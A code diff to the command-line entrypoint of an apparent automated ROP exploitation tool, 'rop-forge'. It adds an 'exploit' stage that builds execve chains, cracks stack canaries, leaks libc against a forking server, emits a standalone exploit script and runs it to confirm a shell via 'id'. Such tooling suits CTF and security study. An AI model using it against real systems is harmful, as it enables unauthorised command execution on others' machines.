@@ -1,7 +1,11 @@
 """Command-line entrypoint for rop-forge."""
 
 import argparse
+import subprocess
 import sys
+import tempfile
+import time
+from pathlib import Path
 
 from rop_forge.analyzer import Protections, analyze_protections
 from rop_forge.canary import CanaryNotFoundError, build_canary_execve_chain, crack_canary, verify_canary_shell
@@ -14,11 +18,14 @@ from rop_forge.chainer import (
     verify_leaked_shell,
     verify_shell,
 )
+from rop_forge.exploit import emit_replay_script, emit_solver_script
 from rop_forge.gadgets import GadgetDatabase, GadgetKind, scan_gadgets
 from rop_forge.leak import ForkingServer, LeakError, probe
 from rop_forge.offset import OffsetNotFoundError, find_offset
 
 _EXAMPLES_PER_KIND = 5
+_REPLAY_RUN_STARTUP = 3.0  # aslr=False, local process() — fast to reach ready-for-input
+_SOLVER_RUN_STARTUP = 45.0  # includes a fresh canary crack + libc leak inside the subprocess itself
 
 STAGES = ["analyzer", "gadgets", "offset", "chainer", "leak", "canary", "exploit"]
 
@@ -58,6 +65,14 @@ def build_parser() -> argparse.ArgumentParser:
             "run a single pipeline stage standalone and print its output, "
             "instead of the full pipeline (debugging/introspection; each "
             "stage wraps the same module function the full pipeline uses)"
+        ),
+    )
+    parser.add_argument(
+        "--output",
+        default=None,
+        help=(
+            "--stage exploit only: write the generated standalone script "
+            "here instead of printing it to stdout"
         ),
     )
     return parser
@@ -122,16 +137,18 @@ def _run_chainer(args: argparse.Namespace) -> int:
         libc_path = _resolve_libc(args)
         with ForkingServer(args.server) as server:
             if analyze_protections(args.binary).canary:
-                chain, header = build_canary_execve_chain(server, libc_path)
-                _print_chain(chain)
+                result = build_canary_execve_chain(server, libc_path)
+                _print_chain(result.chain)
                 if args.run:
-                    return _print_shell_result(verify_canary_shell(server, header, chain))
+                    return _print_shell_result(verify_canary_shell(server, result.header, result.chain))
                 return 0
 
-            chain, offset = build_leaked_execve_chain(server, libc_path)
-            _print_chain(chain)
+            result = build_leaked_execve_chain(server, libc_path)
+            _print_chain(result.chain)
             if args.run:
-                return _print_shell_result(verify_leaked_shell(server, chain, offset))
+                return _print_shell_result(
+                    verify_leaked_shell(server, result.chain, result.offset)
+                )
         return 0
 
     chain = build_execve_chain(args.binary, libc_path=args.libc)
@@ -158,12 +175,89 @@ def _run_canary(args: argparse.Namespace) -> int:
     return 0
 
 
-def _stage_not_yet_implemented(stage: str):
-    def _run(args: argparse.Namespace) -> int:
-        print(f"rop-forge: stage '{stage}' not yet implemented", file=sys.stderr)
-        return 1
+def _run_exploit(args: argparse.Namespace) -> int:
+    if args.server:
+        libc_path = _resolve_libc(args)
+        with ForkingServer(args.server) as server:
+            if analyze_protections(args.binary).canary:
+                result = build_canary_execve_chain(server, libc_path)
+            else:
+                result = build_leaked_execve_chain(server, libc_path)
+        script = emit_solver_script(
+            args.server,
+            libc_path,
+            result.chain,
+            result.offset,
+            result.libc_base,
+            canary_offset=result.canary_offset,
+        )
+        startup = _SOLVER_RUN_STARTUP
+    else:
+        chain = build_execve_chain(args.binary, libc_path=args.libc)
+        offset = find_offset(args.binary)
+        script = emit_replay_script(args.binary, offset, chain)
+        startup = _REPLAY_RUN_STARTUP
 
-    return _run
+    output_path = Path(args.output) if args.output else None
+    if output_path:
+        output_path.write_text(script)
+        print(f"Exploit script written to {output_path}")
+    else:
+        print(script)
+
+    if not args.run:
+        return 0
+
+    script_path, is_temp = (output_path, False) if output_path else (_write_temp_script(script), True)
+    try:
+        ok = _run_emitted_script(script_path, startup)
+    finally:
+        if is_temp:
+            script_path.unlink(missing_ok=True)
+    print()
+    print(
+        "Emitted script verified — got real command execution"
+        if ok
+        else "Emitted script verification failed"
+    )
+    return 0 if ok else 4
+
+
+def _write_temp_script(script: str) -> Path:
+    fd, path = tempfile.mkstemp(suffix=".py", prefix="rop_forge_exploit_")
+    with open(fd, "w") as f:
+        f.write(script)
+    return Path(path)
+
+
+def _run_emitted_script(script_path: Path, startup: float) -> bool:
+    """Executes the emitted script as a genuinely separate process (proving
+    the standalone artifact itself works, not just rop_forge's in-memory
+    chain) and checks for `id`'s own "uid=" output — same proof-of-shell
+    standard as verify_shell()/verify_leaked_shell()/verify_canary_shell()."""
+    proc = subprocess.Popen(
+        [sys.executable, str(script_path)],
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+    )
+    time.sleep(startup)
+    if proc.poll() is not None:
+        proc.stdout.read()
+        return False
+    try:
+        proc.stdin.write(b"id\n")
+        proc.stdin.flush()
+    except BrokenPipeError:
+        pass
+    time.sleep(1.0)
+    proc.terminate()
+    try:
+        out, _ = proc.communicate(timeout=3)
+    except subprocess.TimeoutExpired:
+        proc.kill()
+        out, _ = proc.communicate()
+    return b"uid=" in out
 
 
 STAGE_RUNNERS = {
@@ -173,7 +267,7 @@ STAGE_RUNNERS = {
     "chainer": _run_chainer,
     "leak": _run_leak,
     "canary": _run_canary,
-    "exploit": _stage_not_yet_implemented("exploit"),
+    "exploit": _run_exploit,
 }
 
 
@@ -182,8 +276,13 @@ def _run_full_pipeline(args: argparse.Namespace) -> int:
         exit_code = stage_runner(args)
         if exit_code != 0:
             return exit_code
-    print("rop-forge: remaining pipeline stages not yet implemented", file=sys.stderr)
-    return 1
+    # chainer/leak/canary/exploit are deliberately NOT part of the default
+    # pipeline — the libc gadget scan alone costs ~80s, a real UX cost for
+    # every invocation including quick debugging use (see CONTEXT.md).
+    # They're full, working stages, just opt-in.
+    print()
+    print("rop-forge: run with --stage exploit (add --run to verify live) for a full exploit")
+    return 0
 
 
 def main(argv: list[str] | None = None) -> int:
